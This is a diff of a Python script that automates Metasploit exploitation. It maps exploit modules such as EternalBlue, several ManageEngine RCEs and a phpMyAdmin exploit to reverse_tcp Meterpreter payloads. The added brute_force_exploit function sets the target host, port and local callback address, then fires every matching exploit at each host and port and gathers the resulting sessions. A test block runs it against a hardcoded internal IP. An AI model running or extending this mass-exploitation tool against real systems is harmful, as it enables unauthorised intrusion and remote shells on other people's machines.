@@ -8,13 +8,13 @@ import socket
 ####################################DICTONNARY OF EXPLOIT CONFIG FOR AUTOMATISATION#####################################
 
 dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
-    'RHOST': '',
+    'RHOSTS': '',
     'CheckModule': 'auxiliary/scanner/smb/smb_ms17_010',
     'Payload': 'windows/x64/meterpreter/reverse_tcp',
     'LHOST': ''
 },
     'windows/smb/ms17_010_eternalblue_win8': {
-        'RHOST': '',
+        'RHOSTS': '',
         'Payload': 'windows/x64/meterpreter/reverse_tcp',
         'LHOST': ''
     },
@@ -44,27 +44,27 @@ dictionnary_config_exploit = {'windows/smb/ms17_010_eternalblue': {
     'windows/http/manageengine_apps_mngr': {
         'RHOSTS': '',
         'Payload': 'windows/meterpreter/reverse_tcp',
-        'LHOSTS': ''
+        'LHOST': ''
     },
     'windows/misc/manageengine_eventlog_analyzer_rce': {
         'RHOSTS': '',
         'Payload': 'windows/meterpreter/reverse_tcp',
-        'LHOSTS': ''
+        'LHOST': ''
     },
     'multi/http/phpmyadmin_null_termination_exec': {
         'RHOSTS': '',
         'Payload': 'php/meterpreter/reverse_tcp',
-        'LHOSTS': ''
+        'LHOST': ''
     },
     'multi/http/manageengine_sd_uploader': {
         'RHOSTS': '',
         'Payload': 'java/meterpreter/reverse_tcp',
-        'LHOSTS': ''
+        'LHOST': ''
     },
     'windows/ftp/vermillion_ftpd_port': {
         'RHOSTS': '',
         'Payload': 'windows/meterpreter/reverse_tcp',
-        'LHOSTS': ''
+        'LHOST': ''
     },
     'windows/http/manageengine_appmanager_exec': {
         'RHOSTS': '',
@@ -198,30 +198,143 @@ def get_board_exploit(client):
             output_rows = retrieve_from_html_exploitdb(table)  # query script
             exploit = retrieve_exploit_from_db_info(output_rows, client)  # metasploit_script
             if exploit != -1:
-                for item in exploit:
-                    tmp.append(item)
-        tmp = list(set(tmp))
+                tmp[port] = exploit
         board_of_exploit[str(ip)] = tmp
     return board_of_exploit
 
 
-# def brute_force_exploit(board_of_exploit, ip_vuln, client):
-#
-#     ####################################GET IP HOSTNAME#########################################
-#     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#     s.connect(("8.8.8.8", 80))
-#     hostname = s.getsockname()[0]
-#     s.close()
-#
-#     for exploit in board_of_exploit:
-#         if exploit in [*dictionnary_config_exploit]:
-#             dico_config = dictionnary_config_exploit[exploit]
-#             #############################################CONFIG EXPLOIT###################################
-#             exploit_running = main_run_exploit(exploit, client)
-#             main_change_option_exploit(choosen_option, ip_vuln, type_val, exploit)
-#
+def brute_force_exploit(board_of_exploit, client):
+    #!!!!!!!!!!!!!!!!!!!!!!GLOBAL DICTIONNARY CHECK AT THE TOP OF THE CODE !!!!!!!!!!!!!!!!!!!!!!!!#
+    ####global variable####
+    global session_key_client
+
+    ###########VARIABLES FOR THIS DEFINITION##############
+    session_key_client = None
+
+    ####################################GET IP HOSTNAME#########################################
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    hostname = s.getsockname()[0]
+    s.close()
+
+    for ip in [*board_of_exploit]:
+        for port, list_of_exploit in board_of_exploit[ip].items():
+            for exploit in list_of_exploit:
+                if exploit in [*dictionnary_config_exploit]:
+                    dico_config = dictionnary_config_exploit[exploit]
+                    #############################################CONFIG EXPLOIT###################################
+                    exploit_running = main_run_exploit(exploit, client)
+                    payload = None
+                    for arg, value in dico_config.items() :
+                        if arg == 'RHOSTS':
+                            main_change_option_exploit(arg, ip, 'STR', exploit_running)
+                        if arg == 'CheckModule':
+                            main_change_option_exploit(arg, dico_config[arg], 'STR', exploit_running)
+                        if arg == 'RPORT':
+                            main_change_option_exploit(arg, port, 'STR', exploit_running)
+                        if arg =='Payload':
+                            payload = main_choose_payload(dico_config[arg], client)
+                        if arg =='LHOST' and payload is not None:
+                            main_config_payload(arg, hostname, 'STR', payload)
+                        # print(exploit_running.runoptions)
+                    ############################################RUN EXPLOIT######################################
+                    # pdb.set_trace()
+                    if payload is not None:
+                        json_exploit, session = main_exe_exploit(payload, exploit_running, client)
+
+    return client.sessions.list
 
 
 ########################################################TEST PART#######################################################
 client, console = main_connection()
-print(get_board_exploit(client))
+board = {
+   "172.16.1.2":{
+      "445":[
+         "windows/smb/ms17_010_eternalblue",
+         "windows/smb/ms17_010_eternalblue_win8",
+         "windows/smb/ms17_010_psexec"
+      ],
+      "1617":[
+         "linux/http/cve_2019_1663_cisco_rmi_rce",
+         "linux/http/nuuo_nvrmini_auth_rce",
+         "linux/http/nuuo_nvrmini_unauth_rce",
+         "multi/browser/java_rmi_connection_impl",
+         "multi/http/nuuo_nvrmini_upgrade_rce",
+         "multi/http/phpmyadmin_null_termination_exec",
+         "multi/misc/java_rmi_server",
+         "unix/webapp/coppermine_piceditor",
+         "windows/ftp/vermillion_ftpd_port",
+         "windows/local/service_permissions",
+         "multi/browser/java_jre17_jmxbean",
+         "multi/browser/java_jre17_jmxbean_2",
+         "multi/misc/java_jmx_server"
+      ],
+      "8022":[
+         "multi/browser/java_jre17_jmxbean",
+         "multi/browser/java_jre17_jmxbean_2",
+         "multi/misc/java_jmx_server",
+         "linux/http/cve_2019_1663_cisco_rmi_rce",
+         "linux/http/nuuo_nvrmini_auth_rce",
+         "linux/http/nuuo_nvrmini_unauth_rce",
+         "multi/browser/java_rmi_connection_impl",
+         "multi/http/nuuo_nvrmini_upgrade_rce",
+         "multi/http/phpmyadmin_null_termination_exec",
+         "multi/misc/java_rmi_server",
+         "unix/webapp/coppermine_piceditor",
+         "windows/ftp/vermillion_ftpd_port",
+         "windows/local/service_permissions"
+      ],
+      "8032":[
+         "multi/http/manageengine_auth_upload",
+         "multi/http/manageengine_sd_uploader",
+         "multi/http/manageengine_search_sqli",
+         "windows/http/manageengine_adshacluster_rce",
+         "windows/http/manageengine_appmanager_exec",
+         "windows/http/manageengine_apps_mngr",
+         "windows/http/manageengine_connectionid_write",
+         "windows/misc/manageengine_eventlog_analyzer_rce"
+      ],
+      "8282":[
+         "multi/browser/java_jre17_jmxbean",
+         "multi/browser/java_jre17_jmxbean_2",
+         "multi/misc/java_jmx_server",
+         "linux/http/cve_2019_1663_cisco_rmi_rce",
+         "linux/http/nuuo_nvrmini_auth_rce",
+         "linux/http/nuuo_nvrmini_unauth_rce",
+         "multi/browser/java_rmi_connection_impl",
+         "multi/http/nuuo_nvrmini_upgrade_rce",
+         "multi/http/phpmyadmin_null_termination_exec",
+         "multi/misc/java_rmi_server",
+         "unix/webapp/coppermine_piceditor",
+         "windows/ftp/vermillion_ftpd_port",
+         "windows/local/service_permissions"
+      ],
+      "8444":[
+         "multi/http/manageengine_auth_upload",
+         "multi/http/manageengine_sd_uploader",
+         "multi/http/manageengine_search_sqli",
+         "windows/http/manageengine_adshacluster_rce",
+         "windows/http/manageengine_appmanager_exec",
+         "windows/http/manageengine_apps_mngr",
+         "windows/http/manageengine_connectionid_write",
+         "windows/misc/manageengine_eventlog_analyzer_rce"
+      ],
+      "49182":[
+         "linux/http/cve_2019_1663_cisco_rmi_rce",
+         "linux/http/nuuo_nvrmini_auth_rce",
+         "linux/http/nuuo_nvrmini_unauth_rce",
+         "multi/browser/java_rmi_connection_impl",
+         "multi/http/nuuo_nvrmini_upgrade_rce",
+         "multi/http/phpmyadmin_null_termination_exec",
+         "multi/misc/java_rmi_server",
+         "unix/webapp/coppermine_piceditor",
+         "windows/ftp/vermillion_ftpd_port",
+         "windows/local/service_permissions",
+         "multi/browser/java_jre17_jmxbean",
+         "multi/browser/java_jre17_jmxbean_2",
+         "multi/misc/java_jmx_server"
+      ]
+   }
+}
+print(brute_force_exploit(board, client))
+
